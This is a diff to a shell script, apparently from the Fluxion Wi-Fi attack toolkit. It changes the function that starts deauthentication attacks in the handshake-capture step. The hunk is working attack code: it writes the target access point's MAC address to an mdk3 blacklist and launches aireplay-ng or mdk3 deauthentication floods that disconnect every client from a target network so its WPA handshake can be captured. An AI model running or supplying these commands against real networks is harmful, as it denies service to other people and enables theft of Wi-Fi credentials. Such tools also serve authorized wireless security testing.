@@ -64,12 +64,18 @@ function handshake_stop_deauthenticator() {
 function handshake_start_deauthenticator() {
 	if [ "$HANDSHAKEDeauthenticatorPID" ]; then return 0; fi
 
+	# Prepare deauthenticators
+	case "$HANDSHAKEMethod" in
+		"mdk3"*) echo "$APTargetMAC" > $FLUXIONWorkspacePath/mdk3_blacklist.lst
+	esac
+
+	# Start deauthenticators.
 	case "$HANDSHAKEMethod" in
 		"aireplay-ng"*) xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $APTargetSSID" -e \
 						aireplay-ng --deauth=9999999999 -a $APTargetMAC --ignore-negative-one $WIMonitor &
 			HANDSHAKEDeauthenticatorPID=$!;;
 		"mdk3"*) xterm $FLUXIONHoldXterm $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauthenticating all clients on $APTargetSSID" -e \
-				 mdk3 $WIMonitor d -b $FLUXIONWorkspacePath/mdk3.txt -c $APTargetChannel &
+				 mdk3 $WIMonitor d -b $FLUXIONWorkspacePath/mdk3_blacklist.lst -c $APTargetChannel &
 			HANDSHAKEDeauthenticatorPID=$!;;
 	esac
 }
